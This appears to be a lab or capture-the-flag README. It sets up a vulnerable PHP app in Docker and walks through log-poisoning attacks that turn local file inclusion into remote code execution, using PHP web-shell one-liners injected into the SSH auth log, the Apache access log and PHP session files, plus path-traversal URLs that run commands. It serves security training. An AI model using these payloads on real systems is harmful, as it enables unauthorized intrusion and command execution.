# Build Image
```
$ sudo docker build -t my-php-app .
```

# Run Container
```
$ sudo docker run -d --name my-running-app my-php-app
```

# Hack It!
There is many way to get flag but the main attack is "lfi to rce". We choose to go with stored way.

CheatSheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

## Stored RCE
The consept is using to any of log files for store our php code. Some of these are; http access log (for apache: `/var/log/apache2/access.log`, for nginx `/var/log/nginx/access.log`), ssh auth log (`/var/log/auth.log`) ...

### Using SSH
```
$ ssh '<?=shell_exec($_GET["cmd"])?>@example.com'
```
When we try to connect our log saved under `/var/log/auth.log`.

```
........
May  1 16:17:43 owl sshd[9024]: Accepted publickey for root from 192.168.0.101 port xxxx ssh2
May  1 20:17:43 owl sshd[9024]: ... <?=shell_exec($_GET["cmd"])?> from 121.2xx.xx.xxx port xxxx ssh2
........
```

Now we can access our shell.
`/index.php?page=../../../../../var/log/auth.log&cmd=ls`

### Using Access Log
Send GET request including our php code.
```
GET /test.php <?=system($_GET["cmd"])?> 
```
Now our access log saved into `/var/log/apache2/access.log` (if server uses apache with default configurations).
```
...
172.17.0.1 - - [28/Mar/2020:11:31:58 +0000] "GET /test.php <?=system($_GET["cmd"])?>" 400 0 "-" "-"
...
```
Now we can access our shell.
`/index.php?page=../../../../../var/log/apache2/access.log&cmd=ls`

### Bonus: Using PHP Sessions
Find anything stored in session, like username etc. And type your code and save it to session. Open developer tools and get your session id from cookie `PHPSESSID`. Your session stored in `/tmp/sess_YOUR-PHPSESSID`. Forexample if you enter your user name `test` and if your PHPSESSID value `aecfe47a0f5a42e1bc5941893d45b223` 
```
root@ba9f2ada7228:/# cat /tmp/sess_aecfe47a0f5a42e1bc5941893d45b223 
user|s:4:"test";
```

if you set your user name <?=shell_exec($_GET[cmd]);?>
```
root@ba9f2ada7228:/# cat /tmp/sess_aecfe47a0f5a42e1bc5941893d45b223 
user|s:28:"<?=shell_exec($_GET[cmd]);?>";
```
Now we can access our shell.
`/index.php?page=../../../../../tmp/sess_aecfe47a0f5a42e1bc5941893d45b223&cmd=ls`
